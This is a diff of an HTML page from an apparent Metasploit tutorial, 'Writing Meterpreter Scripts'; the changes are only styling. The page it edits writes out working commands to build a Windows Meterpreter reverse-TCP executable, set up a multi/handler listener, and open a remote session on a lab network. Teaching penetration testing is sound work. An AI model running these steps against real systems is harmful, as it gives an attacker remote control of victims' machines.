@@ -4,7 +4,7 @@
   <meta content="text/html; charset=ISO-8859-1"
  http-equiv="Content-Type">
   <title>Writing Meterpreter Scripts</title>
-</head>
+<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
 <body>
 <h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Writing
 Meterpreter Scripts</h1>
@@ -44,7 +44,7 @@ exploit as we work through our script development.
 <br>
 <br>
 </p>
-<pre style="color: rgb(0, 0, 0);">root@bt4:~# cd /pentest/exploits/framework3/<br>root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.184 X &gt; Meterpreter.exe<br>Created by msfpayload (http://www.metasploit.com).<br>Payload: windows/meterpreter/reverse_tcp<br>Length: 310<br>Options: LHOST=192.168.1.184</pre>
+<pre id="code">root@bt4:~# cd /pentest/exploits/framework3/<br>root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.184 X &gt; Meterpreter.exe<br>Created by msfpayload (http://www.metasploit.com).<br>Payload: windows/meterpreter/reverse_tcp<br>Length: 310<br>Options: LHOST=192.168.1.184</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">Wonderful. Now, we move the
 executable to our Windows machine that
@@ -53,7 +53,7 @@ to set up our listener. To do this, lets create a short script to start
 up multi-handler for us.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# touch meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo use exploit/multi/handler &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo set PAYLOAD windows/meterpreter/reverse_tcp &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo set LHOST 192.168.1.184 &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo set ExitOnSession false &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo exploit -j -z &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# cat meterpreter.rc<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.1.184<br>set ExitOnSession false<br>exploit -j -z</pre>
+<pre id="code">root@bt4:/pentest/exploits/framework3# touch meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo use exploit/multi/handler &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo set PAYLOAD windows/meterpreter/reverse_tcp &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo set LHOST 192.168.1.184 &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo set ExitOnSession false &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# echo exploit -j -z &gt;&gt; meterpreter.rc<br>root@bt4:/pentest/exploits/framework3# cat meterpreter.rc<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.1.184<br>set ExitOnSession false<br>exploit -j -z</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">Here we are using the exploit multi
 handler to receive our payload,
@@ -74,7 +74,7 @@ script.
 <br>
 <br>
 </p>
-<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# ./msfconsole -r meterpreter.rc<br><br><br>=[ metasploit v3.3-rc1 [core:3.3 api:1.0]<br>+ -- --=[ 384 exploits - 231 payloads<br>+ -- --=[ 20 encoders - 7 nops<br>=[ 161 aux<br><br>resource&gt; use exploit/multi/handler<br>resource&gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>resource&gt; set LHOST 192.168.1.184<br>LHOST =&gt; 192.168.1.184<br>resource&gt; set ExitOnSession false<br>ExitOnSession =&gt; false<br>resource&gt; exploit -j -z<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Starting the payload handler...</pre>
+<pre id="code">root@bt4:/pentest/exploits/framework3# ./msfconsole -r meterpreter.rc<br><br><br>=[ metasploit v3.3-rc1 [core:3.3 api:1.0]<br>+ -- --=[ 384 exploits - 231 payloads<br>+ -- --=[ 20 encoders - 7 nops<br>=[ 161 aux<br><br>resource&gt; use exploit/multi/handler<br>resource&gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>resource&gt; set LHOST 192.168.1.184<br>LHOST =&gt; 192.168.1.184<br>resource&gt; set ExitOnSession false<br>ExitOnSession =&gt; false<br>resource&gt; exploit -j -z<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Starting the payload handler...</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">As can be seen above, Metasploit is
 listening for a connection. We
@@ -83,7 +83,7 @@ a session. Once the session is established, we use the sessions command
 with the '&#8211;i' switch and the number of the session to interact with it:
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);">[*] Sending stage (718336 bytes)<br>[*] Meterpreter session 1 opened (192.168.1.158:4444 -&gt; 192.168.1.104:1043)<br><br>msf exploit(handler) &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br><u>meterpreter</u> &gt;</pre>
+<pre id="code">[*] Sending stage (718336 bytes)<br>[*] Meterpreter session 1 opened (192.168.1.158:4444 -&gt; 192.168.1.104:1043)<br><br>msf exploit(handler) &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br><u>meterpreter</u> &gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
 <div style="text-align: center; color: rgb(0, 0, 0);"><a
